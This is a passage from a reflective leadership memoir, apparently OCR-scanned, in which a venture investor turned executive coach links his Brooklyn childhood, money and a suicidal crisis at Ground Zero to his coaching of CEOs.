“She sinned, that’s\nwhy she got sick.” Devoutly religious, Mom must have been racked by\nguilt. I can hear her assuaging her guilt now: “I would have had a dozen,”\nshe’d say all the time, speaking of us kids, “if only the doctors would have\nlet me.”\n\nMaybe, from Grandpa’s point of view, it was Dad’s beers. She would yell\nall the time about his drinking (which worsened after his time in the army),\nright after they were married.\n\nIn manic moments, Mom would slam the table and focus on Dad’s two\nsix-packs of Pabst Blue Ribbon a night. When she was kind, she’d guess\nthat the stench of the Nazi death camps he’d visited in postwar Germany\ncaused him to drink. When she was unkind, she poked at the fact that he\nwasn’t really Italian, that he’d been adopted by an Italian family and he was\nreally a drunk German or Irishman.\n\n“Tf only he weren’t a drunk,” I can hear Grandpa saying to himself, “then\nmy daughter wouldn’t be sick.”\n\nBut maybe the tension between Grandpa and Dad was rooted in the\nfamily splits that went all the way back to the pale limestone of Palo del\nColle outside of Bari. In that tiny village, both Dad’s mother, Mary\nColonna, and Mom’s mother, Nicoletta Guido, were cousins. But not just\ncousins; they were rivals. As a girl, Mary was orphaned and raised by her\naunt. Nicoletta and Mary were, in a sense, sisters.\n\nTo heighten the tensions, each of them married an iceman; Mary married\nVito who was never the entrepreneur that Dominic was.\n\nIf I were forced to guess, I think Grandpa blamed Dad for Mom’s illness.\nHer delusions, her mania, her depression started around the time they got\nmarried. “If only she’d married someone else, had had a different life, was\nable to go to art school as she’d hoped,” I imagine him saying, “then maybe\nmy baby girl wouldn’t be sick.” As a father now, my heart aches when I\nthink of him worrying about his baby girl, my mother.\n\nI weep when I think of Grandpa, helpless and angry, watching his baby,\nhis seventh of seven children, being strapped into a straitjacket and carted\naway to a hospital to have her memories and suffering mind jolted with\nelectroshock therapy again and again. And again.\n\nIt’s hard, even, to imagine his feelings as his daughter’s seven children\nwere divvied up among her siblings and how he and my grandmother would\ntake in my brother John and me.\n\nEven when Mom wasn’t in the hospital, John and I would visit Grandpa\nand Grandma on Wednesdays after school. Their house smelled wonderful:\nof lemon drops kept in a tin in the hallway cupboard with the pale green\ndoor; of coffee ground with a hand-cranked grinder that hung on a kitchen\nwall beneath a photo of the saint, Padre Pio; and, in summer, of newly cut\nroses from Grandma’s garden and figs picked from the tree growing next to\nthe porch at the back of their kitchen—a tree brought as a sapling from Palo\ndel Colle and protected from winter by being wrapped in blankets and old\nrugs, with a bucket on top to keep the rain and snow out.\n\nSuch smells still drop me to my knees. I pass a tree whose springtime\nblossoms are just bursting out and am teleported, instantly, to Brooklyn’s\nProspect Park on a cool April morning. The oddly tangy metallic smell of\nCoppertone sunscreen still makes me feel as if I’ve got grains of beach sand\nstuck in my teeth . . . remnants of the bologna sandwiches Mom would\nmake for our trips to Coney Island. Smells bypass the cognitive, adult parts\nof my brain and go directly to my soul.\n\nThe smells of coffee, roses, and lemon drops signal I’m safe.\n\nI grind whole beans and once again I’m five years old, snuggled into\nGrandma’s lap, my head on her bosom, rocking in her arms, safe, warm,\nand happy. Grandma and Grandpa’s house was my sanctuary from the\nchaos of home.\n\nTo my child’s heart, money meant roses, fresh figs, ground coffee, and\nlemon drops, forever. Money was safety. The pursuit of money, then,\nbecame a chase for safety and a flight from poverty, chaos, and the streets\nof my childhood.\n\n“What will it take?” Dr. Sayres, my psychoanalyst asks me nearly forty\nyears later. “When will you stop?”\n\nI was in my thirties—a father, a success—and I would lie on her couch,\nstaring at the ceiling. I’d been staring at that damn ceiling for seven or eight\nyears already.\n\n“Bill Gates,” I sputter, shocked at my own response. I never thought of\nmyself as pursuing Gates-like wealth. I liked to think I was above that.\n\nBut as I lay there, I had to admit that, to the little boy who’d spent\nSunday dinners hiding out under the dining room table, becoming Bill\nGates—rich would mean lemon drops forever.\n\nMoney, of course, brought with it admiration. People thought I was smart\nbecause I had money. Some of these same folks had dismissed me when it\nseemed that all 1”0 amount to would be poet or college professor—wise but\npoor. Money, success in business, had given me access to power. Suddenly,\nit seemed, my opinion mattered to businesspeople, to politicians, to leaders\nof all sorts. To the people who, as a boy, I barely knew existed when I\nplayed scully, shooting bottlecaps filled with crayon wax on boards carved\ninto the asphalt of East 26th Street in Flatbush, Brooklyn.\n\nMoney and success meant admiration, acknowledgment, accolades.\nMoney and success came to seem ends unto themselves. I wasn’t\ncompletely delusional, of course. And I wasn’t entirely enraptured by\nmoney. There was always enough of the poet inside me to remind me of the\nfalsity of those goals.\n\nAs with Monopoly, the pursuit of success in business became a game,\nsomething to pursue for gratification of the intellect. “See,” “1 quietly\nwhisper to myself, “I’m not just a schmuck from Flatbush. I can run with\nthe big dogs.”\n\nSuccess and money—and even more important, the busyness needed to\ncreate those—became proof of my worth as a human.\nBill Gates, Lemon Drops, and Me\n\nIt surprised me that becoming rich would lead me to want to kill myself.\n\nBut there I was, standing on the lip of the smoking, stinking hole of\nGround Zero. After the 9/11 attack, I had agreed to two things: the first, to\njoin JPMorgan as a venture capital investor; and the second, to serve as a\nco-executive director for New York City’s Olympic Bid committee.\n\nThe former was a plot to scoop up lemon drops. The latter was intended\nto somehow help New York, my home, my city, recover and for me to be\nseen as the hero I yearned to be.\n\nIn the weeks following the attacks, I’d lain awake at night, anxious. I\nmanaged the anxiety by trawling through survival websites, looking for\nemergency ration kits and creating “go” bags of food, water, medical\nsupplies—everything my family and I would need if New York were to be\nattacked again.\n\nIn this hurting state of mind, I began working at JPMorgan and dived\ndeep into raising money for the Olympic bid effort. I was good at both jobs.\nMoving to JPMorgan from my former venture capital firm, Flatiron\nPartners, where I had already amassed a track record as a smart investor\n(and managed to be beloved at the same time), I immediately made some\ngood deals that within a year or two returned three to five times the capital\nwe'd invested.\n\nThe fund-raising went well. I made appearances throughout the city\ndrumming up support for the Olympic bid. I remember showing up at a\ncommunity center in Flushing, Queens, raising money from a local chapter\nof the IBEW (the International Brotherhood of Electrical Workers). “They\ndidn’t just attack our country,” I’d say, imitating a preacher as I walked the\nroom, “they attacked our home. A city where one hundred eighteen\nlanguages are spoken among our 1.2 million schoolkids. They attacked your\nfamily. They attacked my family. They attacked us.”\n\nBut on this day, I teetered on the edge of Ground Zero, among the piles\nthat were, just months before, the twin towers of the World Trade Center.\nThe ping, ping, ping of heavy equipment whose gears had been thrown in\nreverse rang out; bulldozers moved piles of shattered glass, shrapnel, and\nthe smashed remains of people who, months before, were just trying to\nmake enough money to buy their kids lemon drops.\nWall Streeters pass a frozen me as though I were just another of the\nthousands of ghosts haunting the streets of lower Manhattan. Panic fills my\nlungs, choking out the air. I wear a suit and tie to signify my power. I am\nrich. I have a beautiful family. I’m well respected. I even have a new sense\nof purpose—“Look at me. Look at how helpful to my City, Iam. Iam a\ngood boy.” I have all the lemon drops I could ever want. And, still, the old\nseen-but-not-seen feelings remain. I still can’t shake the sense that I am\nhollow, not really occupying the meat bag that is me. I’m in my life but not\nreally living. So why bother? I ask myself. I want to die.\n\nMy head swirls. I want to run downstairs to the subway platform and\nhide. Instead, I reach for my cell phone and call Dr. Sayres in Great Neck.\n\n“Get in a cab and come see me,” she says, taking control. “Get here\nnow.”\n\nOver the coming weeks, we’d talk about what was happening to me.\nBeing there but not really being there. Living a life of there-but-not-there\nhurt like hell.\n\nAnd we’d talk about money, success, Bill Gates, and lemon drops.\n\nThe attacks on 9/11 hurt me. Like so many people, I was scared. The\nnight before the attacks, I’d gone to Yankee Stadium to see my Yanks take\non the damn Red Sox. Roger Clemens was going for his twentieth win that\nseason and I had great seats. The game was rained out.\n\nNevertheless, I stayed in Manhattan that night, away from my home on\nLong Island. The next morning, September 11, I had an early-morning\nflight to Washington. I was having breakfast with some senators when the\nnews of the attacks came in.\n\nAs with many, that day remains with me. A blurry haze of feelings and\nmemories . . . desperation to get home to my family in New York. Desperate\nto find out if those I loved were safe, warm, and happy.\n\nBut that’s not what really drove me to the edge that day in 2002, a few\nmonths after the attack. It was the hollowness of my life itself. It was the\nrealization that, despite having more lemon drops than I could have\nimagined, my heart still hurt.\n\nIt would take many more years to talk through all that had formed me, to\nsort through the bags I’d been carrying since childhood. These were my\nparticular habits of mind; the experiences, patterns, and beliefs, that had led\nme to seek safety and solace through a real-life game of Monopoly by\namassing as much money as 1 could, by grabbing lemon drops, and by\nconstantly comparing my success to that of Bill Gates. This was my mess,\nmy messy baggage, and now, at forty, I was going to have to start taking\ninventory. I was going to have to start sorting it out. There was no place to\nhide.\n\nWhen I was in high school I studied photography and filmmaking. I\nremain fascinated by the fact that film is deceptive. What appears to be\nfluid, ongoing, and always in motion is, in fact, a series of still moments\nviewed incredibly quickly. Just like life itself.\n\nWhat appears fluid is twenty-four frames per second. Twenty-four\nprecious moments per second, lived second after second after second. And\neach of those still moments is imbued with feelings and memories. The\nrapid fluidity of each of those moments defines the patterns and beliefs that,\nin turn, define our lives.\n\nOur lives are twenty-four frames per second, with each frame a set piece\nof feeling, belief, obsession about the past, and anxiety about the future.\nNeither good nor bad, these frames form us. They become the stories we\ntell ourselves again and again to make sense of who we’re becoming, who\nwe’ve been, and who we want to be.\n\nGhosts of our pasts—our grandparents and their grandparents as well as\nthe ghosts of their lives—inhabit the frames. They and their beliefs,\ninterpretations of scenes, words, and feelings haunt the frames of lives as\nsurely as the roses, figs, and lemon drops of our present daily lives do.\n\nSlowing down the movie of our lives, seeing the frames and how they are\nconstructed, reveals a different way to live, a way to break old patterns, to\nsee experiences anew through radical self-inquiry.\n\nPole-Climbing Monkeys\n\nLate into a first conversation with a coaching client, I listen deeply for\nghosts in the frames of his life.\n\n“Jerry, I’m sixty-four and I need to figure out what ]'[1 be doing with my\nlife after I retire.” He’s wealthy enough. He’s certainly successful enough.\nAnd he’s an incredibly well-regarded public figure.\n\n“Tell me about your decision to take that job in Baltimore fifteen years\nago,” I ask, following my intuition.\n“Tt’s funny that you ask about that,” says my client, a little shocked. “My\nfather told me it was the worst decision of my life . . . that I was going to\nregret that decision forever. He said, ‘If you do this, you’ll be raising the\nwhite flag on your career.’”\n\nSuddenly I’m thrust back to being twenty-two. I’ve been working at the\nmagazine for two years, since my college-age summer internship began.\nI’m being recruited to be a speechwriter and an aide to the CEO of NCR, in\nDayton, Ohio. I turn to my Dad for advice: “Remember, Jerry, the higher up\nthe pole the monkey climbs, the more his ass shows.”\n\nHis fear, my father’s fear, is clear. Stay low. Stay outta sight. Stay safe.\n\n“T don’t know what you should do when you retire,” I say, returning to\nmy client. “But I'll be happy to be your thought partner as you work it\nthrough.\n\n“That said,” I continue, “I suspect that it’s time to no longer make\ndecisions based on your father’s fear. To no longer avoid his disapproval or\nto seek his approval. That feels like a good place to start this inquiry.”\n\nOr we can keep trying to put them aside, to ignore them, to shove the\nbaggage of our lives into storage, unsorted, heavy, taking up more room\nwith each year.\n\nTracing forward from these remembrances of things past gives us the\nchance to re-experience and reframe these beliefs. Doing so liberates us\nfrom the confounding forces we label as fate, destiny, or—even more\nfrequently—the other person’s “fault.” We will never sort through them all,\nof course, but what we don’t sort through impedes our happiness. It tricks\nus into using the rest of our lives—and the people we love, the professions\nwe choose, the organizations we lead—to try to close the gaping wounds\nfrom childhood.\n\nThe Safety of Trees\n\nOn a hot summer morning, I stand in the shade of the dying horse chestnut\ntree, its five-fingered leaves, each with a sawtooth edge, shade and cool the\nair. I am seven.\n\nWhen it rains hard, the fattest nuts fall from the branches, their spikes,\nthick, hard, and sharp; their green skin veined with brown spots and worms.\nThe warm rain slips from leaf to leaf as I sit beneath the hundred-foot-tall\ntree. In its trunk is a crack, just big enough for me to hide in. I love the rain.\nI love being in, but not quite all the way in, the rain. The tree is my favorite\nhiding spot.\n\nThe tree’s flowers are white and pink, and the leaf clusters that look so\nmuch like hands have unfolded as if in prayer. Wet/not wet. Warm/not\nwarm. In but out. Seen but not seen. Safe but scared.\n\nInside the building, behind the bay windows of our ground-floor\napartment, Mom and Dad are arguing again. She’s accusing him, again, of\nhaving an affair. Again, he sits there silently. Again, I wait for it, his\nexplosive response. She speaks so loudly that our entire inner life spills out\nonto East 26th Street. The bay windows can’t contain their pain.\n\nPablo, who smeared dog shit on my face just the week before, walks by\nand jeers at me. Even today, I see his leering face, with his gash of a mouth\nand tongue stuck out. Five years older than me, and maybe a foot taller,\nPablo always scared me.\n\nHe seemed to love to torture us younger kids. He loved to taunt me, to\nget me so angry that my face would swell and redden, and I’d stand in the\nmiddle of the asphalt screaming in fury.\n\nOne day he stuck a branch from the chestnut tree into a steaming pile of\nshit and chased me around and around a red car, my head spinning in fear,\nthe air scraping my throat as I desperately tried to outrun Pablo and the\nstick. Such were the games little boys played on East 26th Street.\n\nOver time the crack in the tree’s trunk would grow, and the city would\ncut it down. Half-dead, it had become misshapen and distorted, unsafe to\npassersby. But right then, as a child, I wanted nothing more than to\ndisappear into that crack, to escape the sounds coming from our house, to\nescape the taunts and humiliations of childhood, to shove it all aside.\n\nThe boy under the tree, hiding to feel safe, wishing for lemon drops,\nwishing to be found. Found but not found out. Because if I were found out,\nthey might not like what they saw.\n\nFor being myself was never good enough. Being myself wouldn’t stop\nMom and Dad from fighting. It wouldn’t guarantee we would have enough\nmoney. It wouldn’t stop Dad from going out to John’s Grocery Store for\ntwo six-packs of Pabst Blue Ribbon every night. It wouldn’t stop Mom\nfrom talking to Jesus or to the late Bobby Kennedy. And it failed to keep\nher from saying she was going to kill herself, again and again and again.\nAnd if being myself wasn’t good enough to keep me lemon-drop safe,\nhow could I ever have been comfortable in my skin as a leader? How could\nI take my seat as an adult? How could I grow up?\n\nChoosing to Become Me\n\nMoney. Safety. Shame. A sense of belonging. A desire for escape. The fear\nof being found out. The fear of not being seen, of not being known and\naccepted for who I am. A desire to please. These paradoxes, these secrets,\ncontinue to shape us. But who we choose to be is awakened by the truths\nwe choose to tell.\n\nThere are no epiphanies, no immediate radical discoveries that will\nsuddenly and without work unwind the twisted balls of yarn that define our\nlives. But there are knowable moments, and seeing those knowable\nmoments, and the ghosts they give rise to, can help us—children no more—\nbecome the adults we want to be. This is radical self-inquiry. This is the\npractice of making something good out of the accumulation of losses and\nfalse narratives that we all experience.\n\n“T am not what has happened to me,” taught Carl Jung. “I am what I\nchoose to become.”\n\nBut choosing requires knowing. It requires knowing how what happened\nto us influences the choices we made and continue to make. Again and\nagain I ask my clients, “How are you complicit in creating the conditions of\nyour lives that you say you don’t want?”\n\nBut even more, in what ways does that complicity serve you? How does\nit serve my soon-to-be retired client to remain disconnected from himself\nsuch that he doesn’t know how he’d like to spend his days? In what ways\ndoes it serve him to continue the battle for his father’s approval and against\nhis father’s disapproval?\n\nWe’ve gathered, as we often do, on the first night of one of my\ncompany’s boot camps. We gather folks to help them learn to lead by\ncoming to know themselves better. The knowing-themselves-better can be\nso painful that we liken the process to boot camp, a rigorous training\nground.\n\nWe sit safely in a circle. I read a poem. Tears are flowing in the small\ncircle as they come to what will be the first of many recognitions: They are\nnot alone. They are not alone in their fear, in their shame, in feeling\nunmoored and lost. We are here for radical self-inquiry, I tell them, because\nthat is the path of authenticity and that path leads to resiliency.\n\n“What the fuck are we doing listening to a poem,” one camper yells, his\nfaced twisting in anger. “I didn’t come here to listen to goddamn poetry. I\ncame here to be a better CEO. I have a greedy son-of-a-bitch head of sales\nand he’s driving everyone crazy and I don’t know what to do about him.\nThat’s why I’m here.”\n\nI’ve seen this resistance before; I stay steady. “111 make a deal with you,”\nI say, “If you stay through the weekend and if, at the end of the weekend,\nyou don’t know what to do with him, I'll give you your money back.”\n\nHe calms down. Two days later we’re deep into it. I’ve asked everyone to\nlook at their own lives, to look at the companies they’ve created, the\nconditions they say they don’t want. I turn to the camper with the greedy\nhead of sales. I shock him, “Tell me about the shame.”\n\nHe looks up, his eyes marked by the pain of a hard, hard life.\n\n“T was a teenager when I ran away,” he says, tears streaming. “I started\ndrinking then. I ended up living under an overpass.”\n\n“Tell me about the night and the promise you made to yourself,” I\nprompt.\n\nHe’s startled. His eyes ask, “How did you know?”\n\nHe says out loud, “It was raining, and I was cold...”\n\nHe goes on to explain that he’d sworn that he was never going to be cold\nor hungry or alone again. I nod in recognition. I see him as he sees himself\nmore fully.\n\n“Who hired the sales guy?”\n\nHe looks around sheepishly. “I did.”\n\n“And who promoted him?”\n\n“Me,” says the camper.\n\n“There is nothing to be ashamed of,” I tell him. “The problem isn’t his\ngreed. He’s just doing what you hired him to do. You outsourced your need\nto never be cold and hungry again to someone more acceptable. And he’s\ndoing a great job at that.”\n\n“What if you took back your greed,” I ask him, “and instead see it for\nwhat it truly is: a desire to be safe, warm, and happy?”\n\nTake back the wish, take back the promise you made to yourself, leave\naside the shame and own the fear not as something to deny but as\nsomething that fuels you.\n\nHe brightens. I continue: “Let’s expand that view now. Let’s go beyond\nmaking sure that you and your family are never hungry again. Let’s see the\nways you and your company have made it possible for your employees and\ntheir families to not be hungry. To feel safe, warm, and happy.”\n\nHis body unfolds, and we all bear witness to his taking his seat not\nmerely as a CEO but as a man, capable of providing for the boy under the\noverpass.\n\nRadical self-inquiry is how we learn to become more of ourselves, more\nlike ourselves, more authentic. More human.\n\nAnd better humans are better leaders.\n\nThis is what great leaders do. Great leaders look unflinchingly in the\nmirror and transform untamed hungers and unruly compulsions into\nmoments of self-compassion and understanding. In doing so, they create the\nspaces for each of us to do the same, turning our organizations into places\nof growth and self-actualization. They infuse the profanity of work with the\nsacred duty of Work: the opportunities to lead, to grow into their whole\nselves while nurturing others, encouraging them to do the same.\n\nIt would be easy to paint my realization around work as sacred duty as\nsomething sprung from some genius within. It was not. It sprang from\nexhaustion, from being lost myself, from having nowhere else to turn with\nmy own suffering.\n\nThere’s a story of the Buddha coming to realize the Four Noble Truths—\nthe four foundational beliefs of Buddhism. In the story, he comes to these\nprofound realizations after years of wondering and wandering, seeking\nanswers. In my mind, though, the Buddha is from Flatbush, Brooklyn.\nWhen he finally comes to this moment, it’s with utter desperation and more\nthan a little anger.\n\n“Fuck it,” I hear him say to himself, “I can’t figure out shit. And I’m just\ngonna sit under this bodhi tree until either I die or it makes sense.” And so,\nhe sits.\n\nSo, I sat. 110 walked away from a job, a title, status, and the pursuit of\npassing Go and collecting my next $200. I sat until I began to glimpse the\nways I had been complicit in creating the conditions I said I didn’t want. I\nsat until I began to realize that acknowledging these things within myself\nwas the first step to really being seen—to having the thing I’d wished for all\nmy life.\nMy noble truth, I’m humbled to admit, didn’t come from within me. It\ncame from the simple act of choosing to continue to live. Between the thing\nthat triggers us and our unconsciously chosen action is a tiny bit of space.\nWe grow in such spaces. We radically inquire within in those spaces. Sitting\nstill, we get to see the spaces between the frames of lives speeding by and,\nas a result, see the whole movie with an unattached eye.\n\nIn sitting under my bodhi tree, I quietly came to find my truest calling.\n\nMy friend, the poet Padraig O Tuama, says, “To live well is to see wisely\nand to see wisely is to tell stories.” I'll go further; telling stories helps us\nlive well. Telling the stories of our lives, telling the stories of the lives\naround us, helps us make sense of the world and, in the end, be wise.\n\nWise and sacred. Years ago, as I was beginning to distance myself more\nfully from that day, in 2002, when I teetered on the edge of my own Ground\nZero, I was alone, naked, in a desert in southern Utah. On the second day of\na three-night water-only fast, as part of a fourteen-day quest, I settled into\nthe meaning of the true name I’d be given: Holder. Holder of Stories of the\nHeart. Holder of my stories. Holder of the stories of those I love. Holder of\nthe stories of the brokenhearted leaders who come to me.\n\nOn that second day, I woke with terrible pains in my stomach. I’d had\nplenty of water, but the lack of food was breaking me down. The day\nbefore, I’d stripped down to as few clothes as I could bear. It was a relief to\nhave as little as possible between me, the true me, and the Earth itself. But\nthe bare skin left me raw. The lack of food left me weak, tired, and\nemotionally spent. I looked up to a cluster of boulders and saw a face.\nGrandfather Boulder, I named him. I asked him about my life.\n\n“Holder,” he taught me, “listening opens that which pain has closed.\n\n“You were not given this life only to lament,” he went on. “Make holy\nthat which you were given: Go and listen.”\n\nListening, I’ve come to understand, is bearing witness to lives unfolding,\nto lives being discovered. Deep listening, listening compassionately, means\nguiding, gently nudging, or sometimes shoving people down the path of\nradical self-inquiry so they can make their way to their own truest selves.\nThen, and only then, can they lead with the dignity and grace of being\nhuman.\n\nThe goal, then, is to help you listen to the stories of your heart so that, in\nthe end, you can know the why of your leadership journey and become the\nadult, the full human you were meant to be. Then the simple but hard task\nbecomes clear: Lead from the place of your truest self. Do so not merely for\nyourself but for those who love and entrust their careers to you.\n\nThe process of radical self-inquiry into one’s own leadership journey is\nsupported by standing still and taking the time to ask oneself open, honest\nquestions around the rules we carry. Following each chapter will be a series\nof questions to prompt your own inquiry. Consider these as invitations to\ninquire within.\n\nJournaling Invitations\n\n* How did my relationship to money first get formed?\n\n* How did that relationship shape the work I’ve\nchosen and my definitions of success and failure?\n\n* How does it shape my view of the quality of others’\nwork and contributions?\n\n* What was the belief system around money and work\nthat I grew up with?\n\n* How does that impact my view of my own\nworthiness?\nChapter 2\nThe Crucible and the Warrior\n\nOr course, the night would be perfect; the stars crisp and achingly bright,\nthe lulling cadence of cars crossing into Brooklyn from Manhattan over\nColonel Roebling’s wondrous bridge, the ka-thump, ka-thump, ka-thump of\ntires hitting expansion joints.\n\nEven here on the roof deck of an old Jehovah’s Witnesses building, some\neight floors above the streets of Dumbo, the air is tinged with a faint mix of\nlilac, honeysuckle, and diesel exhaust. I’m sitting on a picnic table while\nChad Dickerson sips from a bottle of beer. Of course, of course, of\ncourse... the night would be sweet and bitter. Tomorrow Chad will\nannounce to the world that he’s been asked to step down as CEO of Etsy,\nthe online marketplace for handcrafted goods he had led for the past six\nyears.\n\nI am here to listen, to bear witness to and hold the story of this\nbittersweet moment. It’s painful to watch my client, my friend, confront this\nnew reality. Although he’d done many things right, although he’d grown\ninto a leader with heart and authenticity, he was being fired.\n\nHis pain hangs in the air. And because my vocation is to be with people\nin their joy and their suffering, to hold myself as a container for them to\nwork through such moments, my pain is exquisite—beautiful, delicate,\nsharp, piercing my heart like a needle. Nevertheless, there’s no place I’d\nrather be than here, with him, with this pain. “Listening,” I remember,\n“opens that which pain has closed.”\nI watch his eyes—I always watch my clients’ eyes. Our eyes moist with\nmemories, we talk of the time six years before. Just a few weeks into the\njob, he’d called me on his walk home from the office. The sudden reality of\nbeing CEO had churned the bile of his self-doubt and he’d vomited.\n\n“Oh, Jerry,” he said then. “Help me. I can’t do this.”\n\n“Yes, you can,” ‏٭1‎ told him then.\n\n“Oh, Jerry,” he says to me now, turning his weary, beaten-down eyes to\nme, “I did a good job, didn’t I?”\n\n“Yeah. Yeah, you did,” I assure him.\n\nWe met regularly for most of those six years. Usually in his office,\nsurrounded by handmade Etsy things—a cutting board in the shape of New\nYork State, hand-polished cherry guitar picks, and coasters made to look\nlike handmade cherry guitar picks. Outside the office, monstrous AC ducts\nhad been wrapped in knitted covers to mask the ugly metal.\n\nSometimes we met in a conference room even more beautifully\ndecorated. I won’t forget the quilted and stuffed faux deer head mounted on\nthe wall, as if after a kill. We'd talk of practical challenges. The difficulty of\nbuilding an executive team when the company had such a profound history\nof dysfunction and a culture where all things that smacked of traditional\nbusiness were (rightfully) suspect.\n\nHow do you attract a CFO, a general counsel, or a head of marketing\nwhen the culture finds such functions an anathema? How do you hold the\nheart of what is special, embracing the rebels and misfits who define the\ngreatness of your organization, while creating a tolerant and caring space\nfor those who’ve built their career on doing well at more traditional\ncompanies?\n\nBack on the roof, I’m startled. I see something familiar but new in Chad,\nsomething powerful, something even more important than success or failure\nas a CEO. Years before, I’d given him the metaphor I often use with clients:\n“Take your seat.” “Sit like royalty in your leadership seat,” I say. “Sit as if\nyou’ve the right to be there.”\n\nOver time, he’d done just that. He’d taken his seat, the company had\ngrown, he’d built a powerful team, and the stomach churning had subsided.\nHe did this by looking at his own stuff, through radical self-inquiry.\nWelcome to the Not-Knowing\n\nClients come to me seeking the answers. “How the hell do I do this job?”\nthey ask either implicitly or explicitly. They act as if there’s a playbook, a\nsecret handbook that will teach them everything they need to know about\nleading.\n\nThe worst are the high achievers, the folks who made it through school\nby quickly figuring out what it took to get an A and then delivering\nwhatever the teacher wanted. Figure out the rules, they’d learned, and\nsucceed. And when they’re given the task of leading and they can’t figure\nout the rules, the vomit-inducing panic takes over.\n\nThis situation is nailed by a wonderful scene near the end of the seven-\nyear run of the TV show Mad Men. Peggy, who’s finally fully in charge,\nturns to her old boss, Don, for help. Don, who’s about to leave the world of\nmad men forever, has emerged as a brokenhearted sage.\n\nDON: I want you to feel good about what you’re doing, but you’ ll\nnever know. That’s just the job.\n\nPEGGY: What’s the job?\n\nDON: Living in the “not-knowing.”\n\nClients come to me because the “not-knowing” is so unbearable. I often\nmake them crazy when I tell them the answer isn’t in a book. “There’s no\nbook,” I say, often nearly preaching. “There’s no ‘way,’ no ‘path,’ that’s\nbeen kept hidden from you.” Some of them get angry when I ask them\nabout their past or what’s in their heart.\n\nBut I know that the truest path, the only way, for a warrior to emerge is\nthrough the path of radical self-inquiry, the process by which the mask is\ncompassionately stripped away until there’s no place left to hide.\n\nOn the roof, again, watching Chad, reassuring him, I realize he’s gone\nbeyond taking his seat as a CEO. He’s grown into something calmer,\nsteadier. He’d become not merely the man he’d always intended to be, the\nman he chose to be, but a gentle, brokenhearted warrior who leaned into his\nown pain to find the strength to do what is right.\n\nBoth of us had learned of his termination only a few days before. I\nthought about how he carried himself over those last few days, about how—\ndespite having been fired—he’d worked late into the night to get the data\nright, to care for his colleagues, to tend to the company as he’d always\ndone.\n\n“What would Obama do?” we took to asking each other in moments\nwhen his heart flagged. How do you handle yourself on the way out,\nregardless of whether you were given the respect you deserved?\n\nThe back of the warrior is strengthened by knowledge of knowing the\nright thing to do. The soft, open heart is made resilient by remembering\nwho you are, what you have come through, and how those things combine\nto make you unique as a leader.\n\n“What would Obama do?” became both a rallying cry and an inside joke.\nWhat standards of dignity do you hold yourself to, regardless of how things\nunfold? What do the people who have counted on you to lead them need\nfrom you at this moment?\n\nThese questions shaped our inquiry into how he should handle what had\ntranspired. His desire for radical self-inquiry had enabled him to ask (and to\nanswer), “What kind of leader am I?”\n\nIndeed, the simple act of asking, “What kind of leader am I?” implicitly\nacknowledges that there is no one way to lead.\n\nI thought of the all-nighters he and his team had pulled, missing their\nfamilies as they faced tasks at hand—cutting budgets, finding the savings.\nAgain, I thought of Carl Jung: “I am not what has happened to me. I am\nwhat I choose to become.” Looking ahead to how Chad would carry himself\nas the news became public—as he passed the baton to his successor; as he\nfielded questions from his team, his colleagues, his coworkers, his friends,\nand his family—I knew he’d sit regally, steady even in his shaky\nvulnerability.\n\nI knew he would be transparent about his pain, but I didn’t realize that\nthe dignity with which he communicated would make him the epitome of\ngrace.\n\nTurning to his face, this weary soul with a beer in his hand, his gray hair\nin need of a trim, I could see it more clearly. “Oh, shit,” I muttered to no\none in particular, “this is his crucible moment.” This was Chad’s rite of\npassage, as leadership expert Warren Bennis put it: “Some magic takes\nplace in the crucible of leadership. . . . The individual brings certain\nattributes into the crucible and emerges with new, improved leadership\nskills. Whatever is thrown at them, leaders emerge from their crucibles\nstronger and unbroken.”\n\nThat’s the arc. We’re smacked in the head by the realization that life isn’t\nunfolding as we’d hoped, that all our careful plotting hasn’t protected us\nfrom the shock of failure and disappointment. Our lives falter. Our\ncompanies stagger. We are in that alchemist’s crucible, and the heat of loss\nand pain is turned up. We’re being cooked.\n\nOur co-founder has quit. Our investors pull funding. Our number one\ncustomer returns the product because it simply doesn’t work. Our spouse\ngives up on us. Our board fires us. Such are the moments to stare deeply\ninto our own experience. Who are we? What are we made of? What\nconditions are our lives in and, radically as important, how have we been\ncomplicit in creating the conditions we so steadfastly declare we do not\nwant?\n\nFrom that place, the warrior leader emerges.\n\nI stare at this gentle but fierce, caring but incisive man and realize that he\nhas emerged not only as the CEO he was meant to be but as a man stronger\nand unbroken. His resiliency rises from the very same place that holds his\npain. His loss is the source of his strength.\n\nWho knew that his truest, most demanding crucible of leadership, the\nmoment of his fiercest emergence, would come at the end of his first turn in\nthe CEO seat?\n\nThe Crucible of Leadership\n\nLearning to lead yourself is the hardest part of becoming a leader. That’s\none of the things new CEOs and aspiring entrepreneurs come to me for.\nThey come because they feel lonely; they don’t have anyplace else to put\nthe feelings. They’ Il sit on my couch or pace while they talk on the phone,\npausing as we grapple with issue after issue after issue.\n\nLearning to lead yourself is hard because we are wired to look outward.\nWe feel pain and we look up and out to see who’s hurt us. We feel loss, and\nthe hurt gives rise to anger as we look for someone to blame.\n\nLearning to lead yourself is hard because it requires us to look at the\nreality of all that we are—not to fix blame on ourselves but to understand\nwith clarity what is really happening in our lives.\nLearning to lead yourself is hard because it is painful. Growth is painful;\nthat’s why so few choose to do it.\n\nMoreover, the common denominator in all our struggles is always people.\nWhen I first take on clients, I warn them that I don’t have a magic wand.\nNevertheless, their wish for some elixir to mend their relationships is\nheartbreakingly visceral.\n\nWhen we start our leadership journey together, my clients frequently\nassume that the hardest part of their job will be figuring out what to do,\nwhat strategies to deploy, what business models to operationalize. Like so\nmany, they have been seduced by the notion that being a leader means\nhaving all the answers, solving all the problems, and telling everyone else\nwhat to do.\n\nSelf-doubt convinces us that there’s a magic path and if we can only find\nand follow the yellow-brick road, we’ll end up safe, warm, and happy—\nsuccessful leaders, beloved adults, retiring in Millionaire Acres at the end of\nThe Game of Life. And we’ll never be hungry, cold, alone, or afraid again.\n\nOne of the most profound teachings I’ve ever received came from a\nsimple sutra from the Buddha: we are basically, unalterably good. We are\nborn that way. (And, as evidence, the Buddha pointed to our humanity. Only\nhumans, he taught, can achieve enlightenment and so, simply because we\nare human, we are essentially good.)\n\nBut each of us grows, seeking love, safety, and belonging. We seek to\nlove and be loved. We need to feel safe physically, spiritually, and\nexistentially. And we yearn to belong.\n\nLearning to lead ourselves is hard because in the pursuit of love, safety,\nand belonging, we lose sight of our basic goodness and twist ourselves into\nwhat we think others want us to be. We move away from the source of our\nstrengths—our core beliefs, the values we hold dear, the hard-earned\nwisdom of life—and toward an imagined playbook listing the right way to\nbe.\n\nWe are inevitably knocked on our asses by the demands of leading. And\nwhen we make mistakes—when we fail to 